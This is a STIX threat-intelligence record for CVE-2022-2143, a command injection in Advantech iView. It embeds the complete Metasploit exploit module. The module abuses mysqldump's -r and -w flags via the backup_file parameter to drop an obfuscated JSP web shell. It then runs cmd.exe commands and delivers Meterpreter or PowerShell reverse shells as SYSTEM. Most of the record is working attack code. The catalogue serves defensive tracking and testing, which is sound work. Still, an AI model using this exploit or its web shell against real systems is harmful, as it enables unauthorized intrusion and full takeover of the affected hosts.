{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7f16d37-5378-4985-8721-63ab7cfb7609",
    "created": "2024-08-14T16:54:36.663403Z",
    "modified": "2024-08-14T16:54:36.663408Z",
    "name": "Advantech iView NetworkServlet Command Injection",
    "description": " Versions of Advantech iView software below `5.7.04.6469` are vulnerable to an unauthenticated command injection vulnerability via the `NetworkServlet` endpoint. The database backup functionality passes a user-controlled parameter `backup_file` to the `mysqldump` command. The sanitization functionality only tests for SQL injection attempts and directory traversal, so leveraging the `-r` and `-w` `mysqldump` flags permits exploitation. The command injection vulnerability is used to write a payload on the target and achieve remote code execution as NT AUTHORITY\\SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/advantech_iview_networkservlet_cmd_inject.rb",
            "external_id": "advantech_iview_networkservlet_cmd_inject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://y4er.com/post/cve-2022-2143-advantech-iview-networkservlet-command-inject-rce/"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-2143"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Advantech iView NetworkServlet Command Injection',\n        'Description' => %q{\n          Versions of Advantech iView software below `5.7.04.6469` are\n          vulnerable to an unauthenticated command injection vulnerability\n          via the `NetworkServlet` endpoint.\n          The database backup functionality passes a user-controlled parameter,\n          `backup_file` to the `mysqldump` command. The sanitization functionality only\n          tests for SQL injection attempts and directory traversal, so leveraging the\n          `-r` and `-w` `mysqldump` flags permits exploitation.\n          The command injection vulnerability is used to write a payload on the target\n          and achieve remote code execution as NT AUTHORITY\\SYSTEM.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rgod', # Vulnerability discovery\n          'y4er', # PoC\n          'Shelby Pace' # Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://y4er.com/post/cve-2022-2143-advantech-iview-networkservlet-command-inject-rce/'],\n          [ 'CVE', '2022-2143']\n        ],\n        'Platform' => [ 'win' ],\n        'Privileged' => true,\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'Type' => :win_dropper,\n              'CmdStagerFlavor' => [ 'psh_invokewebrequest', 'vbs' ],\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2022-06-28',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'The base path to Advantech iView', '/iView3']),\n        OptString.new('USERNAME', [ false, 'The user name to authenticate with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'The password to authenticate with', 'password'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    return CheckCode::Unknown('Failed to receive a response from the application') unless res\n\n    unless res.body.include?('iView')\n      return CheckCode::Safe('No confirmation that target is Advantech iView')\n    end\n\n    res = send_db_backup_request('')\n    return CheckCode::Detected('Failed to receive response from backup request') unless res\n\n    # The patch added auth as a requirement for\n    # accessing the NetworkServlet endpoint\n    if res.body =~ /ERROR:\\s+User\\s+Not\\sLogin/\n      @needs_auth = true\n      print_status('Vulnerability is present, though authentication is required.')\n    end\n\n    CheckCode::Appears\n  end\n\n  def send_db_backup_request(filename)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet'),\n      'keep_cookies' => true,\n      'vars_post' =>\n      {\n        'page_action_type' => 'backupDatabase',\n        'backup_filename' => filename\n      }\n    )\n  end\n\n  def format_jsp\n    bin_nums = []\n    arg_nums = []\n    flag_nums = []\n\n    bin_param.each_char { |c| bin_nums << c.ord }\n    bin_nums = bin_nums.join(',')\n    arg_param.each_char { |c| arg_nums << c.ord }\n    arg_nums = arg_nums.join(',')\n    flag_param.each_char { |c| flag_nums << c.ord }\n    flag_nums = flag_nums.join(',')\n\n    '<%=new String(com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromStream((' \\\n    'new ProcessBuilder(request.getParameter(' \\\n    \"new java.lang.String(new byte[]{#{bin_nums}})),\" \\\n    \"request.getParameter(new java.lang.String(new byte[]{#{flag_nums}})),\" \\\n    \"request.getParameter(new java.lang.String(new byte[]{#{arg_nums}}))).start())\" \\\n    '.getInputStream()))%>'\n  end\n\n  def flag_param\n    @flag_param ||= Rex::Text.rand_text_alpha(3..8)\n  end\n\n  def arg_param\n    @arg_param ||= Rex::Text.rand_text_alpha(3..8)\n  end\n\n  def bin_param\n    @bin_param ||= Rex::Text.rand_text_alpha(3..8)\n  end\n\n  def jsp_filename\n    @jsp_filename ||= \"#{Rex::Text.rand_text_alpha(5..12)}.jsp\"\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, jsp_filename),\n      'keep_cookies' => true,\n      'vars_get' =>\n      {\n        bin_param => 'cmd.exe',\n        flag_param => '/c',\n        arg_param => cmd\n      }\n    )\n  end\n\n  def iview_authenticate\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Login page not found') unless res && res.body.include?('loginWindow')\n    vprint_good('Successfully accessed the login page')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'CommandServlet'),\n      'keep_cookies' => true,\n      'vars_post' => {\n        'page_action_service' => 'UserServlet',\n        'page_action_type' => 'login',\n        'user_name' => datastore['USERNAME'],\n        'user_password' => datastore['PASSWORD'],\n        'use_ldap' => 'false',\n        'data' => ''\n      }\n    )\n\n    unless res && res.body.include?('Success')\n      fail_with(Failure::BadConfig, 'Authentication failed. Credentials likely incorrect.')\n    end\n    vprint_good('Authentication successful!')\n  end\n\n  def need_auth?\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'NetworkServlet')\n    )\n    return false unless res\n\n    !!(res.body =~ /ERROR:\\s+User\\s+Not\\sLogin/)\n  end\n\n  def exploit\n    if @needs_auth || need_auth?\n      iview_authenticate\n    end\n\n    jsp_code = format_jsp\n\n    sql_filename = \"#{Rex::Text.rand_text_alpha(5..12)}.sql\"\n    full_cmd = \"#{sql_filename}\\\" -r \\\"./webapps/iView3/#{jsp_filename}\\\" -w \\\"#{jsp_code}\\\"\"\n\n    res = send_db_backup_request(full_cmd)\n    fail_with(Failure::UnexpectedReply, 'Failed to write JSP file to target') unless res\n\n    path = \"webapps\\\\iView3\\\\#{jsp_filename}\"\n    register_file_for_cleanup(path)\n    if target['Type'] == :win_dropper\n      execute_cmdstager\n    else\n      execute_command(payload.encoded)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-06-28",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}